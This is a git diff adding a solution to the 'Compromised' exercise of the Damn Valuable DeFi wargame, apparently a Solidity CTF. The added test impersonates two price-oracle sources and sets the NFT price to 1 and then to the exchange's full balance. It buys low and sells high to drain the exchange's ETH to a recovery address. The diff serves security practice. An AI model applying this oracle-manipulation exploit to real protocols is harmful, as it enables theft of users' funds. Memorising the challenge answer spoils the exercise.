@@ -9,6 +9,8 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Base64} from "solady/utils/Base64.sol";
+import {LibString} from "solady/utils/LibString.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +77,39 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        console.log("player balance: ", player.balance);
+        console.log("exchange balance: ", address(exchange).balance);
+        console.log("price: ", oracle.getMedianPrice("DVNFT"));
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", 1);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 1);
+        console.log("price: ", oracle.getMedianPrice("DVNFT"));
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 1}();
+        console.log("player balance: ", player.balance);
+
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+        console.log("price: ", oracle.getMedianPrice("DVNFT"));
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        console.log("player balance: ", player.balance);
+        console.log("exchange balance: ", address(exchange).balance);
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "call failed");
+        vm.stopPrank();
+
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        console.log("price: ", oracle.getMedianPrice("DVNFT"));
     }
 
     /**
